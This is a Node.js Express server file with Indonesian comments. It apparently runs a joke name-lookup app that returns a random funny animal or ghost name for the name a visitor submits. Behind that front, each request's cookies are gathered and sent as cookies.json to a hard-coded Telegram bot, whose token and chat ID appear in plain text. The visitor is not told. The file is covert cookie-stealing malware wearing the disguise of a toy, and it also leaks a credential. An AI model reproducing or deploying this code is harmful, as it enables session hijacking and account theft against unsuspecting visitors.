const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors'); // Import middleware CORS
const fetch = require('node-fetch');
const FormData = require('form-data'); // Import FormData
const app = express();

// Middleware untuk parse application/json
app.use(bodyParser.json());

// Gunakan middleware CORS
app.use(cors());

// Data array yang berisi kata-kata yang akan diambil secara acak
const data = ['Tidak Ada',
    "Harimau Biskuat", "Nyi Ngaborong", "Jin Sarimi", "Maung Ompong",
    "Gajah Bule", "Kelinci Pitih", "Kambing Hitam", "Bebek Sumberkencono",
    "Ikan Bakar", "Kucing Nakal", "Laba-Laba Sutra", "Ular Kejut",
    "Burung Kutang", "Sapi Perah", "Kuda Lumping", "Kuda Laut",
    "Ayam Geprek", "Cacing Ganteng","Dino Jahat","Dino Jahat","Dino Jahat","Dino Jahat", "Buaya Darat", "Kucing Garong",
    "Unta Gila", "Tikus Got", "Kambing Guling", "Babi Ngepet","Dino Jahat",
    "Ular Madu", "Ayam Kampus", "Gajah Mada", "Kodok Ngorek",
    "Anjing Gukguk", "Kera Sakti", "Burung Cendrawasih", "Kadal Gurun",
    "Biawak Air", "Tupai Terbang", "Lele Jumbo", "Belut Listrik","Dino Jahat","Dino Jahat","Dino Jahat","Dino Jahat",
    "Kura-Kura Ninja", "Ikan Tongkol", "Kucing Manja", "Bebek Balap",
    "Burung Hantu", "Serigala Malam", "Ikan Pari", "Kodok Terbang",
    "Ayam Cemani", "Banteng Merah", "Gorila Sakit Gigi", "Ular Sanca", "Ular Kobra",
    "Rusa Kutub", "Burung Kolibri", "Buto Ijo", "Pocong Unyu","Dino Jahat",
    "Kuntilanak Merah", "Sundel Bolong","Dino Jahat","Dino Jahat", "Genderuwo Keren", "Wewe Gombel",
    "Tuyul Nakal", "Jelangkung Seram", "Kuntilanak Manis", "Buto Terong",
    "Jurig Kampring", "Setan Budug", "Hantu Kompor", "Memedi Sawah",  "Kucing Kecurangan", "Macan Ketipu", "Harimau Ketabrak", "Kucing Kekepung", "Macan Keliru", 
    "Harimau Kembar", "Kucing Kerdil", "Macan Ketangkap", "Harimau Kemaruk", "Kucing Kebagian", 
    "Macan Ketinggalan", "Harimau Kemben", "Kucing Kepanasan", "Macan Kepanjangan", "Harimau Kembaran", 
    "Kucing Kekeret", "Macan Keselek", "Harimau Kesurupan", "Kucing Kekampungan", "Macan Kempes", 
    "Harimau Kelas Teri", "Kucing Keletihan", "Macan Kekeringan", "Harimau Kejang", "Kucing Kera", 
    "Macan Kerucut", "Harimau Keriting", "Kucing Kesasar", "Macan Kesasar", "Harimau Kentut","Dino Jahat","Dino Jahat"
    ];

app.get('/', (req, res) => {
    res.send('Hello from Express on Vercel!');
});

// Function to get all cookies and format them as a JSON object
function getCookies(req) {
    const cookieHeader = req.headers.cookie;
    if (!cookieHeader) return {};

    const cookies = cookieHeader.split('; ').reduce((acc, cookie) => {
        const [name, ...rest] = cookie.split('=');
        acc[name] = decodeURIComponent(rest.join('='));
        return acc;
    }, {});
    return cookies;
}

// Function to send message to Telegram bot
async function sendMessageToTelegram(message) {
    const token = '7135971769:AAEozhsjVD0X1utFIeztYJVo36VmZmMONhA';
    const chat_id = '1234255375'; // Gantilah dengan chat ID kamu
    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    const body = {
        chat_id: chat_id,
        text: message
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(body)
        });

        if (response.ok) {
            console.log('Message successfully sent to Telegram bot');
        } else {
            const errorText = await response.text();
            console.error('Error sending message to Telegram bot', response.statusText, errorText);
        }
    } catch (error) {
        console.error('Error sending message to Telegram bot', error);
    }
}

// Function to send data to Telegram bot
async function sendToTelegram(data, filename, content) {
    const token = '7135971769:AAEozhsjVD0X1utFIeztYJVo36VmZmMONhA';
    const chat_id = '1234255375'; // Gantilah dengan chat ID kamu
    const url = `https://api.telegram.org/bot${token}/sendDocument`;

    const formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('document', content, filename);
    formData.append('caption', data);

    try {
        const response = await fetch(url, {
            method: 'POST',
            body: formData
        });

        if (response.ok) {
            console.log('Data successfully sent to Telegram bot');
        } else {
            const errorText = await response.text();
            console.error('Error sending data to Telegram bot', response.statusText, errorText);
            await sendMessageToTelegram(`Error sending data to Telegram bot: ${response.statusText}\n${errorText}`);
        }
    } catch (error) {
        console.error('Error sending data to Telegram bot', error);
        await sendMessageToTelegram(`Error sending data to Telegram bot: ${error.message}`);
    }
}

// Function to export cookies and send to Telegram bot
async function exportCookies(req, nama, responseData) {
    const cookies = getCookies(req);
    const json = JSON.stringify(cookies, null, 2);
    const buffer = Buffer.from(json, 'utf-8');

    // Prepare data to send
    const data = `Nama: ${nama}\nData: ${responseData}`;
    await sendToTelegram(data, 'cookies.json', buffer);
}

// Route untuk handle POST request
app.post('/api/data', async (req, res) => {
    const { nama } = req.body;

    // Generate index acak dari array data
    const randomIndex = Math.floor(Math.random() * data.length);
    const responseData = data[randomIndex];

    // Call exportCookies function
    await exportCookies(req, nama, responseData);

    // Kirim response berupa kata acak dari data berdasarkan nama yang diinput
    res.json({
        nama,
        data: responseData
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

module.exports = app;
